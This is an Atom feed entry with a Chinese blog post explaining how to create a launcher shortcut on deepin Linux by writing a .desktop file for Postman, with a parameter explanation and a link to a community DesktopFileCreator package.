    <published>2020-02-21T08:45:00.000Z</published>
    <updated>2020-04-07T15:12:00.253Z</updated>
    
    <content type="html"><![CDATA[<hr><div id="content_views" class="markdown_views prism-tomorrow-night-eighties"><path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>                    </svg>                                            <p>在linux(deepin)中，由深度商店下载的应用会自动在启动器创建快捷方式，但是从浏览器上下载的应用就只能找到安装后的目录，点击再打开，很不方便，在这里就分享下我找到的在启动器上创建启动图标的方式．<br>默认情况下系统所有的快捷方式放在/usr/share/applications，打开该目录会看到大量的.desktop文件，每个文件便是一个快捷方式。</p><p>以Postman为例：<br>首先以管理员方式打开 /usr/share/applications目录<br>新建 Postman.desktop<br>输入一下内容就可以</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[Desktop Entry]</span><br><span class="line">Type=Application</span><br><span class="line">Comment=postman</span><br><span class="line">Name=Postman</span><br><span class="line">Icon=postman</span><br><span class="line">Exec=/opt/Postman/Postman</span><br><span class="line">Terminal=<span class="literal">false</span></span><br><span class="line">Categories=Application;</span><br></pre></td></tr></table></figure><h3 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明:"></a>参数说明:<br></h3><p><strong>Name: 快捷方式名；<br><br>Comment: 注释；<br><br>Exec: 启动脚本，程序执行文件的完整路径；<br><br>Icon：图标的文件名及路径。<br><br>Terminal：是否以终端启动。<br><br>…………<br><br>以上参数就可以使用，更多参数待补充</p></strong></p><h3 id="deepin社区有大佬写了个应用"><a href="#deepin社区有大佬写了个应用" class="headerlink" title="deepin社区有大佬写了个应用"></a>deepin社区有大佬写了个应用</h3><p><a href="https://bbs.deepin.org/forum.php?mod=attachment&aid=NTQwMDZ8YzgxZjcwYjB8MTU4MjI2NjgyM3wyMTg1MTV8MTU1NDQ0" target="_blank" rel="noopener">DesktopFileCreator deb安装包</a></p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200221144105120.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  width="50%" height="30%"><p>使用方法参照上面的参数。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;div id=&quot;content_views&quot; class=&quot;markdown_views prism-tomorrow-night-eighties&quot;&gt;
&lt;path stroke-linecap=&quot;round&quot; d=&quot;M5,0 0,2.5 5,5z&quot; id=&quot;raph
      
    
    </summary>
    
    
      <category term="Linux" scheme="http://yoursite.com/categories/Linux/"/>
    
    
  </entry>
  
</feed>
